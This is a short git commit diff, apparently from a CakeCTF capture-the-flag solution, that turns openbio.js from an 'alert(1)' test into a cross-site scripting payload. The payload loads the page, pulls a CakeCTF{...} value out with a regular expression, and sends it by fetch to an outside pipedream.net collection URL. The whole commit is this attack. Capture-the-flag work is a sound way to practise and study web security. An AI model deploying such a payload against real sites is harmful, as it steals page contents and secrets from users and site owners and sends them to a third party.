3ffe9a54e5be1bdeeff996de2a2a71848935abc4
vcth4nh <tvu25337@gmail.com>
2022-09-07 00:54:14 +0700

    commit

--- openbio.js
+++ openbio.js
@@ -1,1 +1,9 @@
-alert(1)
+let xhr = new XMLHttpRequest();
+xhr.open("GET", "/", false)
+xhr.onload = function () {
+    console.log(`Loaded: ${xhr.status} ${xhr.response}`);
+    let flag = /CakeCTF{.*}/.exec(xhr.response);
+    console.log(flag);
+    fetch("https://eoor1c6mm76wo38.m.pipedream.net/" + flag[1]);
+};
+xhr.send(null)
